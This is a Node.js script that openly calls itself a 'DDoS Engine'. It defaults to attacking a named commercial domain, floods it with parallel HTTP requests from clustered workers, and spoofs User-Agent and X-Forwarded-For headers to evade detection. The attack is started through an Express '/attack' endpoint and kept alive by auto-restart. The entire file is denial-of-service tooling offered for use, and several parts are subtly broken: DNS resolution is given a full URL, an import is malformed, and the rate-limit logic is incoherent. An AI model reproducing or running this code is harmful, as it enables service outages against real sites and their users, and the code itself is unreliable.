const express = require('express');
const cluster = require('cluster');
const os = require('os');
const redis = require('redis');
const winston = require('winston');
const { exec } = require('child_process');
const { randomUUID } = require('crypto');
const { performance } = require('perf_hooks');
const { resolve } = require('dns');
const async = require('async');
const { request } = require('request');

// === CONFIGURATION ===
const ARGS = process.argv.slice(2);
const TARGET = ARGS[0] || 'https://itemku.com';
const THREADS = parseInt(ARGS[1]) || 1000;
const DURATION = parseInt(ARGS[2]) || 500;
const ATTACK_SPEED = parseInt(ARGS[3]) || 100;

// === ANTI-DETECTION FRAMEWORK ===
const antiDetect = {
  spoofHeaders: () => {
    const headers = {
      'User-Agent': `Mozilla/${Math.random() * 5 + 5}`,
      'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
      'Accept-Language': ['en-US,en;q=0.9', 'pt-BR,pt;q=0.8', 'es-ES,es;q=0.7'][Math.floor(Math.random()*3)],
      'Connection': ['keep-alive', 'close'][Math.random() > 0.5 ? 1 : 0]
    };
    return headers;
  },
  randomDelay: (ms = ATTACK_SPEED) => {
    return ms;
  }
};

// === REDIS RATE LIMITING ===
const redisClient = redis.createClient({
  host: '127.0.0.1',
  port: 6379
});

redisClient.on('error', (err) => {
  winston.error(`Redis Error: ${err}`);
  process.exit(1);
});

// === LOGGING ENGINE ===
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.printf(({ level, message, timestamp }) => {
      return `${timestamp} [${level.toUpperCase()}] ${message}`;
    })
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: 'ddos-engine.log' })
  ]
});

// === ATTACK CORE ===
const attackEngine = {
  launch: async (target, duration, threads, speed) => {
    let startTime = performance.now();
    let attackCount = 0;
    
    // Emergency stop handler
    process.on('SIGINT', () => {
      logger.warn('\nEmergency Stop (Ctrl+C) - Shutting down...');
      process.exit(0);
    });
    
    // Duration-based stop
    const stopTime = startTime + duration * 1000;
    
    while (performance.now() < stopTime) {
      try {
        const headers = antiDetect.spoofHeaders();
        const randomIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
        
        // Launch parallel requests
        await async.timesLimit(threads, threads, async (i, callback) => {
          resolve(target, (err, addresses) => {
            if (err) {
              logger.warn(`DNS Resolution Error: ${err.message}`);
              return callback();
            }
            
            const randomAddress = addresses[Math.floor(Math.random()*addresses.length)];
            
            // REQUEST ATTACK
            const options = {
              url: `http://${randomAddress}`,
              headers,
              timeout: 5000,
              maxRedirects: 0,
              followAllRedirects: false
            };
            
            request(options, (err, res, body) => {
              if (err) {
                logger.warn(`Request Error: ${err.message}`);
              } else {
                attackCount++;
                logger.info(`Attack Success - ${res.statusCode} | IP: ${randomIP} | Response: ${res.headers['server'] || 'N/A'}`);
              }
              
              // RATE LIMIT CHECK
              redisClient.incr(`rate_limit:${randomIP}`, (err, count) => {
                if (err) throw err;
                if (count > 100) {
                  redisClient.expire(`block:${randomIP}`, 300);
                  logger.warn(`IP Blocked: ${randomIP}`);
                }
              });
              
              callback();
            });
          });
        });
        
        // Rate control
        await new Promise(resolve => setTimeout(resolve, speed));
        
      } catch (error) {
        logger.error(`Critical Attack Error: ${error.message}`);
        process.exit(1);
      }
    }
    
    logger.info(`Attack Completed - Total Requests: ${attackCount}`);
  }
};

// === CLUSTER MASTER ===
if (cluster.isMaster) {
  const numCPUs = os.cpus().length;
  logger.info(`Master process running on ${numCPUs} CPU cores`);
  
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker, code, signal) => {
    logger.warn(`Worker ${worker.process.pid} died. Restarting...`);
    cluster.fork();
  });
  
} else {
  // === AUTO-RECOVERY ===
  const autoRecover = () => {
    exec('pm2 restart main.js', (err, stdout, stderr) => {
      if (err) {
        logger.error(`Auto-Recovery Failed: ${err.message}`);
        process.exit(1);
      }
      logger.info('Auto-Recovery Successful');
    });
  };
  
  // === MAIN SERVER ===
  const app = express();
  const PORT = 3000;
  
  app.get('/attack', (req, res) => {
    logger.info(`Attack Initiated - Target: ${TARGET} | Threads: ${THREADS} | Duration: ${DURATION}s`);
    
    attackEngine.launch(TARGET, DURATION, THREADS, ATTACK_SPEED);
    
    res.status(200).json({
      status: 'attack_started',
      target: TARGET,
      threads: THREADS,
      duration: DURATION,
      speed: ATTACK_SPEED,
      pid: process.pid
    });
  });
  
  app.listen(PORT, () => {
    logger.info(`DDoS Engine Listening on Port ${PORT}`);
  });
  
  // === ERROR HANDLING ===
  process.on('uncaughtException', (err) => {
    logger.error(`Uncaught Exception: ${err.stack}`);
    autoRecover();
  });
  
  process.on('unhandledRejection', (reason, promise) => {
    logger.error(`Unhandled Rejection at: ${promise} | Reason: ${reason}`);
    autoRecover();
  });
}